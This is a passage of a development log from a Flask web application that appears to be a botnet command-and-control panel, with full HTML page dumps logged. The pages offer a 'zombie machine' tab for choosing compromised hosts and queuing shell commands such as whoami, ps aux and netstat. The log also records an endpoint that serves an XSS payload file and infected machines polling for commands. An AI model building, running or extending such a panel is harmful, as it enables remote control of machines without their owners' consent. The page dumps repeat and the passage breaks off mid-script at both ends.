background: linear-gradient(135deg, #f8d7da, #f5c6cb);\n        color: #721c24;\n        border: 1px solid #f5c6cb;\n    }\n\n    .back-btn {\n        display: inline-block;\n        background: linear-gradient(135deg, #667eea, #764ba2);\n        color: white;\n        padding: 15px 30px;\n        border-radius: 10px;\n        text-decoration: none;\n        font-weight: bold;\n        transition: all 0.3s ease;\n        box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);\n    }\n\n    .back-btn:hover {\n        transform: translateY(-3px);\n        box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);\n        text-decoration: none;\n        color: white;\n    }\n\n    @media (max-width: 768px) {\n        .test-form {\n            grid-template-columns: 1fr;\n            gap: 10px;\n        }\n\n        .endpoint-header {\n            flex-direction: column;\n            align-items: flex-start;\n            gap: 10px;\n        }\n    }\n</style>\n\n<script>\n    function copyPayload(button) {\n        const text = button.getAttribute(\'data-payload\');\n        navigator.clipboard.writeText(text).then(function () {\n            // 顯示複製成功提示\n            const originalText = button.textContent;\n            button.textContent = \'✅ 已複製\';\n            button.style.background = \'#28a745\';\n\n            setTimeout(() => {\n                button.textContent = originalText;\n                button.style.background = \'#28a745\';\n            }, 2000);\n        }).catch(function (err) {\n            console.error(\'複製失敗: \', err);\n            alert(\'複製失敗，請手動複製\');\n        });\n    }\n\n    function testGetRequest() {\n        const message = document.getElementById(\'testMessage\').value;\n        const ip = document.getElementById(\'testIP\').value;\n        const resultDiv = document.getElementById(\'testResult\');\n\n        if (!message) {\n            resultDiv.className = \'test-result error\';\n            resultDiv.textContent = \'請輸入測試消息\';\n            return;\n        }\n\n        // 使用相對路徑（因為在同一個域名下）\n        const url = `/api/control/add_message?message=${encodeURIComponent(message)}&target_ip=${encodeURIComponent(ip)}`;\n\n        resultDiv.textContent = \'發送中...\';\n        resultDiv.className = \'test-result\';\n\n        fetch(url)\n            .then(response => response.json())\n            .then(data => {\n                if (data.status === \'success\') {\n                    resultDiv.className = \'test-result success\';\n                    resultDiv.innerHTML = `\n                    <strong>✅ 測試成功!</strong><br>\n                    消息: ${data.data.message}<br>\n                    目標IP: ${data.data.target_ip || \'未指定\'}<br>\n                    時間: ${data.data.timestamp}<br>\n                    <small>完整URL: ${window.location.origin}${url}</small>\n                `;\n                } else {\n                    resultDiv.className = \'test-result error\';\n                    resultDiv.textContent = `❌ 錯誤: ${data.error}`;\n                }\n            })\n            .catch(error => {\n                resultDiv.className = \'test-result error\';\n                resultDiv.textContent = `❌ 請求失敗: ${error.message}`;\n            });\n    }\n</script>\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 19:34:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:34:22] "GET /api/control/help HTTP/1.1" 200 -
2025-06-24 19:34:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:34:22] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-24 19:34:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:34:22] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 19:34:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:34:31] "[33mGET /api/control HTTP/1.1[0m" 404 -
2025-06-24 19:34:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:34:32] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 19:34:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 19:34:38 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 19:34:38 | ERROR    | control_route.py:77 | get_messages() | 獲取消息時發生錯誤: (sqlite3.OperationalError) no such column: web_shell_back_point.where
[SQL: SELECT web_shell_back_point.id AS web_shell_back_point_id, web_shell_back_point.target_ip AS web_shell_back_point_target_ip, web_shell_back_point.target_config AS web_shell_back_point_target_config, web_shell_back_point."where" AS web_shell_back_point_where, web_shell_back_point.created_at AS web_shell_back_point_created_at, web_shell_back_point.to_do_command AS web_shell_back_point_to_do_command 
FROM web_shell_back_point]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-06-24 19:34:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0233s) -> 回傳: (<Response 587 bytes [200 OK]>, 500)
2025-06-24 19:34:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:34:38] "[35m[1mGET /api/control/get_messages HTTP/1.1[0m" 500 -
2025-06-24 19:34:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:34:38] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 19:34:53 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 19:34:53 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 19:34:53 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 19:34:53 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 19:34:53 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 19:34:53 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 19:34:53 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 19:34:53 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 19:34:53 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 19:34:57 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 19:34:57 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 19:34:57 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 19:34:57 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 19:34:57 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 19:34:57 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 19:34:57 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 19:34:57 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 19:34:57 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 19:34:57 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 19:34:57 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 19:34:57 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 19:34:57 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 19:34:57 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 19:34:57 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 19:34:57 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 19:34:57 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 19:34:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 19:34:57 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 19:34:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0284s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 19:34:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:34:57] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 19:34:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:34:57] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 19:34:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:34:57] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 19:34:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:34:59 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:34:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:34:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:34:59] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:35:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 19:35:12 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 19:35:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 562 bytes [200 OK]>
2025-06-24 19:35:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:12] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 19:35:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 19:35:17 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 19:35:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 562 bytes [200 OK]>
2025-06-24 19:35:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:17] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 19:35:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:17] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 19:35:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 19:35:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 19:35:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:17 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 19:35:17 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 19:35:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 19:35:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 19:35:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:17] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:17] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 19:35:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:17] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 19:35:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 19:35:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:17 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 19:35:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:17] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0019s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = 